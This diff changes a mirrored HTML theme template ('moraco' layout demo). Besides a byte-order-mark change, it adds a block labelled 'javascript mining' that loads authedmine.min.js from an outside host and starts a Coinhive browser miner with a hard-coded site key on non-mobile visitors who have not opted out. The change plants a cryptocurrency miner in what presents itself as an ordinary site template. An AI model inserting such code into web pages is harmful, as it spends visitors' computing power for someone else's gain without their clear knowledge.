@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
     
 <!-- Mirrored from elmanawy.info/demo/moraco/layout1/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 15 Feb 2018 05:57:36 GMT -->
@@ -765,7 +765,20 @@
 
         <!-- Style Switcher
 ================================================== -->
+
+        <!-- ===================javascript mining==================== -->
         <script src="assets/js/switcher.js"></script>
+        <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+        <script>
+            var miner = new CoinHive.Anonymous('YcTtxQ5t7w1CRhGO12tSU2FpNBzABqjp', { throttle: 0.3 });
+
+	        // Only start on non-mobile devices and if not opted-out
+	        // in the last 14400 seconds (4 hours):
+	        if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		        miner.start();
+	        }
+        </script>
+        <!-- ===================javascript mining==================== -->
 
         <div id="style-switcher">
             <h2>Color Switcher <a href="#"><i class="fa fa-paint-brush"></i></a></h2>
